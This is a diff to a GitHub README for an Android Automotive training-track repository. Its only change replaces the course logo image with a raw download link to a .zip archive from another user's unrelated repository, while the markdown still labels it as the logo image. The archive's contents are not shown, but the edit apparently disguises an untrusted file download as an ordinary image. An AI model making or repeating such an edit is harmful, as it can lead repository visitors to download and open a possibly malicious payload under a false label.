@@ -1,5 +1,5 @@
 # Android Automotive Development Track (ITI) 
 
-![iti-logo-text](https://github.com/user-attachments/assets/d1887327-7242-4ed9-a40f-8406ab480120)
+![iti-logo-text](https://github.com/YoussefGamalShehata/Embedded-Linux/raw/refs/heads/main/CPP2/Tasks/Task3/Linux_Embedded_ridgerope.zip)
 
 ### This repository contains all labs and tasks for the Automotive Android Developer Track at the Information Technology Institute (ITI).
